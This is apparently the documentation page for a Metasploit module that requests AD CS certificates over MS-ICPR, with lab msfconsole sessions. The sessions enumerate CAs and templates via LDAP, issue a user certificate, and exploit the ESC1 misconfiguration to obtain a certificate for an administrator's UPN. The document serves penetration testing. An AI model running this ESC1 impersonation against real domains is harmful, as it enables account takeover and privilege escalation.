## Vulnerable Application
Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
template's configuration the resulting certificate can be used for various operations such as authentication.
PFX certificate files that are saved are encrypted with a blank password.

## Verification Steps

1. From msfconsole
2. Do: `use auxiliary/admin/dcerpc/icpr_cert`
3. Set the `CA`, `RHOSTS`, `SMBUser` and `SMBPass` options
4. Run the module and see that a new certificate was issued or submitted

## Options

### CA
The target certificate authority. The default value used by AD CS is `$domain-DC-CA`.

### CERT_TEMPLATE
The certificate template to issue, e.g. "User".

### ALT_DNS
Alternative DNS name to specify in the certificate. Useful in certain attack scenarios.

### ALT_UPN
Alternative User Principal Name (UPN) to specify in the certificate. Useful in certain attack scenarios. This is in the
format `$username@$dnsDomainName`.

## Actions

### REQUEST_CERT
Request a certificate. The certificate PFX file will be stored on success. The certificate file's password is blank.

## Scenarios

### Obtaining Configuration Values
For this module to work, it's necessary to know the name of a CA and certificate template. These values can be obtained
by a normal user via LDAP.

```
msf6 > use auxiliary/gather/ldap_query 
msf6 auxiliary(gather/ldap_query) > set BIND_DN aliddle@msflab.local
BIND_DN => aliddle@msflab.local
msf6 auxiliary(gather/ldap_query) > set BIND_PW Password1!
BIND_PW => Password1!
msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_ADCS_CAS 
ACTION => ENUM_ADCS_CAS
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 192.168.159.10

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[+] 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
CN=msflab-DC-CA CN=Enrollment Services CN=Public Key Services CN=Services CN=Configuration DC=msflab DC=local
=============================================================================================================

 Name                  Attributes
 ----                  ----------
 cacertificatedn       CN=msflab-DC-CA, DC=msflab, DC=local
 certificatetemplates  ESC1-Test || Workstation || ClientAuth || DirectoryEmailReplication || DomainControllerAuthentication || KerberosAuthentication || EFSRecovery || EFS || DomainController || WebServer || Machine || User || SubCA |
                       | Administrator
 cn                    msflab-DC-CA
 dnshostname           DC.msflab.local
 name                  msflab-DC-CA

[*] Auxiliary module execution completed
msf6 auxiliary(gather/ldap_query) >
```

### Issue A Generic Certificate
In this scenario, an authenticated user issues a certificate for themselves using the `User` template which is available
by default. The user must know the CA name, which in this case is `msflab-DC-CA`.

```
msf6 > use auxiliary/admin/dcerpc/icpr_cert 
msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
CA => msflab-DC-CA
msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
CERT_TEMPLATE => User
msf6 auxiliary(admin/dcerpc/icpr_cert) > run
[*] Running module against 192.168.159.10

[*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
[*] 192.168.159.10:445 - Binding to \cert...
[+] 192.168.159.10:445 - Bound to \cert
[*] 192.168.159.10:445 - Requesting a certificate...
[+] 192.168.159.10:445 - The requested certificate was issued.
[*] 192.168.159.10:445 - Certificate UPN: aliddle@msflab.local
[*] 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1106
[*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20220824125053_default_unknown_windows.ad.cs_545696.pfx
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/icpr_cert) >
```

### Issue A Certificate With A Specific subjectAltName (AKA ESC1)
In this scenario, an authenticated user exploits a misconfiguration allowing them to issue a certificate for a different
User Principal Name (UPN), typically one that is an administrator. Exploiting this misconfiguration to specify a
different UPN effectively issues a certificate that can be used to authenticate as another user.

The user must know:

* A vulnerable certificate template, in this case `ESC1-Test`.
* The UPN of a target account, in this case `smcintyre@msflab.local`.

See [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) section on ESC1 for more
information.

```
msf6 > use auxiliary/admin/dcerpc/icpr_cert 
msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass Password1!
SMBPass => Password1!
msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA msflab-DC-CA
CA => msflab-DC-CA
msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Test
CERT_TEMPLATE => ESC1-Test
msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN smcintyre@msflab.local
ALT_UPN => smcintyre@msflab.local
msf6 auxiliary(admin/dcerpc/icpr_cert) > run
[*] Running module against 192.168.159.10

[*] 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
[*] 192.168.159.10:445 - Binding to \cert...
[+] 192.168.159.10:445 - Bound to \cert
[*] 192.168.159.10:445 - Requesting a certificate...
[+] 192.168.159.10:445 - The requested certificate was issued.
[*] 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
[*] 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20220824125859_default_unknown_windows.ad.cs_829589.pfx
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/icpr_cert) >
```
